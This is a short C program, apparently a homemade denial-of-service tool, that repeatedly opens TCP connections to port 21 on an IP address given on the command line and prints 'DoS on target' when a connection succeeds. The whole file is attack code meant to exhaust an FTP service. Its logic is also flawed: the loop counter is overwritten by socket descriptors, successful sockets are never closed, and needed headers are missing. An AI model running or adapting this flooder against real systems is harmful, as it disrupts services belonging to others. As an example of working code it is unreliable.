#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdbool.h>

int main(int argc, char *argv[]){

    int sock;
    int connection;
    int start = 0;
    int final = 9999999;
    char *destnation;
    destnation = argv[1];

    struct sockaddr_in target;
    for (sock=start; sock<final;sock++){

    
    
    sock = socket (AF_INET, SOCK_STREAM, 0);
    target.sin_family = AF_INET;
    target.sin_port = htons (21);
    target.sin_addr.s_addr = inet_addr(destnation);


    connection = connect(sock, (struct sockaddr *)&target, sizeof target);
    if (connection ==0){
        printf ("DoS on target %s\n", destnation);
    }
    else{

        close(sock);
        close(connection);
    }
     

        
    }
        

}